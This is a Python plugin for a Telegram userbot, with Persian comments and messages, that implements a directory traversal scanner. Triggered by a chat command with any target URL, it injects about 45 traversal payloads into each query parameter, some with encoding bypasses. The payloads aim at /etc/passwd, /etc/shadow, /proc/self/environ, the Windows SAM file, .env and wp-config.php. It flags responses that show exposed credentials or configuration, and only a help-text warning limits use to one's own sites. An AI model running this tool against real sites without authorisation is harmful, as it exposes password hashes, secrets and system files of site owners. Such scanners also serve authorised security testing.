# plugins/dirtraversal.py

from telethon import events
from client import client
import aiohttp
import urllib.parse
import re
import asyncio
import os
from typing import List, Dict, Optional

class DirectoryTraversalScanner:
    def __init__(self):
        self.vulnerable_urls = []
        self.payloads = {
            'unix': [
                '../../../etc/passwd',
                '../../../../etc/passwd',
                '../../../../../etc/passwd',
                '../../../../../../etc/passwd',
                '../../../etc/shadow',
                '../../../etc/hosts',
                '../../../proc/version',
                '../../../proc/self/environ',
                '....//....//....//etc/passwd',
                '..\\..\\..\\etc\\passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd',
                '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
                '/var/log/apache/access.log',
                '/var/log/apache2/access.log',
                '/etc/apache2/apache2.conf',
                '/etc/mysql/my.cnf',
                '/etc/php/php.ini'
            ],
            'windows': [
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '..\\..\\..\\windows\\win.ini',
                '..\\..\\..\\windows\\system.ini',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '..\\..\\..\\boot.ini',
                '..\\..\\..\\autoexec.bat',
                '..\\..\\..\\config.sys',
                '....\\\\....\\\\....\\\\windows\\\\win.ini',
                '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
                '..%255c..%255c..%255cwindows%255cwin.ini',
                'C:\\windows\\system32\\drivers\\etc\\hosts',
                'C:\\windows\\win.ini',
                'C:\\boot.ini'
            ],
            'generic': [
                '../index.php',
                '../../index.php',
                '../../../index.php',
                '../config.php',
                '../../config.php',
                '../../../config.php',
                '../.env',
                '../../.env',
                '../../../.env',
                '../wp-config.php',
                '../../wp-config.php',
                '../database.php',
                '../config/database.php',
                '../app/config/database.php'
            ]
        }
        self.signatures = {
            'unix_passwd': [
                'root:x:0:0:',
                'daemon:x:1:1:',
                'bin:x:2:2:',
                'nobody:x:',
                '/bin/bash',
                '/bin/sh',
                '/sbin/nologin'
            ],
            'unix_shadow': [
                'root:$',
                'daemon:*:',
                'bin:*:',
                'nobody:*:'
            ],
            'windows_hosts': [
                '# Copyright (c) 1993-2009 Microsoft Corp.',
                '127.0.0.1       localhost',
                '::1             localhost'
            ],
            'windows_ini': [
                '[fonts]',
                '[extensions]',
                '[mci extensions]',
                'for 16-bit app support'
            ],
            'config_files': [
                '<?php',
                'define(',
                '$config',
                'database',
                'password',
                'DB_PASSWORD',
                'DB_HOST'
            ]
        }
        self.session = None
        
    async def test_directory_traversal(self, url: str, param: str) -> List[Dict]:
        """تست Directory Traversal"""
        vulnerabilities = []
        
        # تست payloadهای مختلف
        all_payloads = []
        all_payloads.extend(self.payloads['unix'])
        all_payloads.extend(self.payloads['windows'])
        all_payloads.extend(self.payloads['generic'])
        
        for payload in all_payloads:
            try:
                test_url = self._build_test_url(url, param, payload)
                
                async with self.session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    content = await resp.text()
                    
                    # بررسی نشانه‌های مختلف فایل‌ها
                    detection_result = self._detect_file_content(content, payload)
                    
                    if detection_result:
                        vulnerabilities.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'file_type': detection_result['type'],
                            'confidence': detection_result['confidence'],
                            'evidence': detection_result['evidence'],
                            'severity': self._calculate_severity(detection_result['type'])
                        })
                        
            except Exception:
                continue
                
        return vulnerabilities
    
    def _build_test_url(self, base_url: str, param: str, payload: str) -> str:
        """ساخت URL تست با payload"""
        parsed = urllib.parse.urlparse(base_url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [payload]
        
        new_query = urllib.parse.urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _detect_file_content(self, content: str, payload: str) -> Optional[Dict]:
        """تشخیص محتوای فایل"""
        content_lower = content.lower()
        
        # بررسی /etc/passwd
        passwd_matches = sum(1 for sig in self.signatures['unix_passwd'] if sig in content)
        if passwd_matches >= 2:
            return {
                'type': 'unix_passwd',
                'confidence': min(passwd_matches * 25, 100),
                'evidence': f'{passwd_matches} Unix user entries found'
            }
        
        # بررسی /etc/shadow
        shadow_matches = sum(1 for sig in self.signatures['unix_shadow'] if sig in content)
        if shadow_matches >= 2:
            return {
                'type': 'unix_shadow',
                'confidence': min(shadow_matches * 30, 100),
                'evidence': f'{shadow_matches} Shadow file entries found'
            }
        
        # بررسی Windows hosts
        hosts_matches = sum(1 for sig in self.signatures['windows_hosts'] if sig in content)
        if hosts_matches >= 2:
            return {
                'type': 'windows_hosts',
                'confidence': min(hosts_matches * 35, 100),
                'evidence': f'{hosts_matches} Windows hosts entries found'
            }
        
        # بررسی Windows INI files
        ini_matches = sum(1 for sig in self.signatures['windows_ini'] if sig in content_lower)
        if ini_matches >= 2:
            return {
                'type': 'windows_ini',
                'confidence': min(ini_matches * 30, 100),
                'evidence': f'{ini_matches} Windows INI sections found'
            }
        
        # بررسی فایل‌های config
        config_matches = sum(1 for sig in self.signatures['config_files'] if sig in content_lower)
        if config_matches >= 3:
            return {
                'type': 'config_file',
                'confidence': min(config_matches * 20, 100),
                'evidence': f'{config_matches} Configuration indicators found'
            }
        
        # بررسی کلی برای فایل‌های سیستمی
        if len(content) > 100 and any(indicator in content_lower for indicator in 
                                     ['root:', 'administrator', 'system32', '/bin/', '/usr/', '/var/']):
            return {
                'type': 'system_file',
                'confidence': 60,
                'evidence': 'System file indicators detected'
            }
        
        return None
    
    def _calculate_severity(self, file_type: str) -> str:
        """محاسبه شدت آسیب‌پذیری"""
        severity_map = {
            'unix_passwd': 'critical',
            'unix_shadow': 'critical',
            'windows_hosts': 'high',
            'windows_ini': 'medium',
            'config_file': 'high',
            'system_file': 'medium'
        }
        return severity_map.get(file_type, 'low')

@client.on(events.NewMessage(pattern=r"\.dirtraversal(?:\s+(.+))?", outgoing=True))
async def directory_traversal_scanner(event):
    url_input = event.pattern_match.group(1)
    reply = await event.get_reply_message()

    if not url_input and reply:
        url_input = reply.message.strip()

    if not url_input:
        await event.reply("""
🗂️ **Directory Traversal Scanner**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**استفاده:**
`.dirtraversal https://example.com/page.php?file=image.jpg`
`.dirtraversal http://target.com/download.php?path=docs`

**قابلیت‌های پیشرفته:**
• تست 40+ payload مختلف
• شناسایی فایل‌های حساس Unix/Linux
• تشخیص فایل‌های سیستم Windows
• تحلیل فایل‌های پیکربندی
• ارزیابی شدت آسیب‌پذیری
• گزارش تفصیلی با مدارک

**فایل‌های هدف:**
🔴 **/etc/passwd** - اطلاعات کاربران Unix
🔴 **/etc/shadow** - رمزهای عبور Unix
🟠 **Windows INI** - پیکربندی Windows
🟡 **Config Files** - فایل‌های تنظیمات
🟢 **Log Files** - فایل‌های گزارش

⚠️ **هشدار:** فقط برای تست سایت‌های خودتان!
        """.strip())
        return

    await event.edit("🗂️ شروع اسکن Directory Traversal...")

    try:
        if not url_input.startswith(('http://', 'https://')):
            url_input = 'https://' + url_input

        parsed_url = urllib.parse.urlparse(url_input)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            await event.edit("❌ URL باید حاوی پارامتر باشد (مثل ?file=test.txt)")
            return

        scanner = DirectoryTraversalScanner()
        all_vulnerabilities = []
        
        await event.edit(f"🗂️ تست {len(params)} پارامتر برای Directory Traversal...")

        async with aiohttp.ClientSession() as session:
            scanner.session = session
            
            # تست هر پارامتر
            for param_name in params.keys():
                await event.edit(f"🗂️ تست پارامتر {param_name}...")
                vulnerabilities = await scanner.test_directory_traversal(url_input, param_name)
                all_vulnerabilities.extend(vulnerabilities)

        # تجزیه و تحلیل نتایج
        await event.edit("📊 تحلیل نتایج Directory Traversal...")
        
        if all_vulnerabilities:
            # گروه‌بندی بر اساس نوع فایل و شدت
            vuln_by_type = {}
            vuln_by_severity = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
            
            for vuln in all_vulnerabilities:
                file_type = vuln['file_type']
                severity = vuln['severity']
                
                if file_type not in vuln_by_type:
                    vuln_by_type[file_type] = []
                vuln_by_type[file_type].append(vuln)
                vuln_by_severity[severity] += 1
            
            # ساخت گزارش
            type_summary = []
            type_icons = {
                'unix_passwd': '🔴',
                'unix_shadow': '🔴',
                'windows_hosts': '🟠',
                'windows_ini': '🟡',
                'config_file': '🟠',
                'system_file': '🟢'
            }
            
            type_names = {
                'unix_passwd': 'Unix Passwd File',
                'unix_shadow': 'Unix Shadow File',
                'windows_hosts': 'Windows Hosts File',
                'windows_ini': 'Windows INI File',
                'config_file': 'Configuration File',
                'system_file': 'System File'
            }
            
            for file_type, vulns in vuln_by_type.items():
                icon = type_icons.get(file_type, '⚠️')
                name = type_names.get(file_type, file_type)
                highest_confidence = max(v['confidence'] for v in vulns)
                type_summary.append(f"  {icon} **{name}:** {len(vulns)} مورد (اطمینان: {highest_confidence}%)")
            
            # نمایش آسیب‌پذیری‌های بحرانی
            critical_vulns = [v for v in all_vulnerabilities if v['severity'] == 'critical'][:3]
            vuln_details = []
            
            for i, vuln in enumerate(critical_vulns):
                short_payload = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                vuln_details.append(f"  {i+1}. 🔴 `{short_payload}`")
                vuln_details.append(f"     📍 Evidence: {vuln['evidence']}")
                vuln_details.append(f"     📊 Confidence: {vuln['confidence']}%")
            
            # تعیین سطح خطر کلی
            total_vulns = len(all_vulnerabilities)
            if vuln_by_severity['critical'] > 0:
                risk_level = "🔴 بحرانی"
                risk_color = "🔴"
            elif vuln_by_severity['high'] > 1:
                risk_level = "🟠 بالا"
                risk_color = "🟠"
            elif total_vulns > 2:
                risk_level = "🟡 متوسط"
                risk_color = "🟡"
            else:
                risk_level = "🟢 پایین"
                risk_color = "🟢"
            
            msg = f"""
{risk_color} **گزارش Directory Traversal Scanner**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **هدف:** {parsed_url.netloc}
🗂️ **پارامترهای تست شده:** {len(params)}
⚠️ **آسیب‌پذیری‌های یافت شده:** {total_vulns}
🚨 **سطح خطر:** {risk_level}

📈 **فایل‌های قابل دسترسی:**
{chr(10).join(type_summary)}

📊 **توزیع شدت:**
  🔴 **Critical:** {vuln_by_severity['critical']}
  🟠 **High:** {vuln_by_severity['high']}
  🟡 **Medium:** {vuln_by_severity['medium']}
  🟢 **Low:** {vuln_by_severity['low']}

🔍 **آسیب‌پذیری‌های بحرانی:**
{chr(10).join(vuln_details) if vuln_details else "  ✅ آسیب‌پذیری بحرانی یافت نشد"}

⚠️ **هشدار امنیتی:** فوری دسترسی به فایل‌های سیستمی را محدود کنید!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """.strip()
        else:
            msg = f"""
🟢 **گزارش Directory Traversal Scanner**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **هدف:** {parsed_url.netloc}
🗂️ **پارامترهای تست شده:** {len(params)}
✅ **نتیجه:** هیچ آسیب‌پذیری Directory Traversal یافت نشد
🚨 **سطح خطر:** 🟢 امن

📈 **تست‌های انجام شده:**
  🔴 **Unix Files:** بررسی شد
  🟠 **Windows Files:** بررسی شد
  🟡 **Config Files:** بررسی شد
  📊 **40+ Payloads:** تست شد

✅ **سایت در برابر حملات Directory Traversal محافظت شده است**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """.strip()

        await event.edit(msg)

    except Exception as e:
        await event.edit(f"⚠️ خطا در اسکن Directory Traversal: {str(e)}")
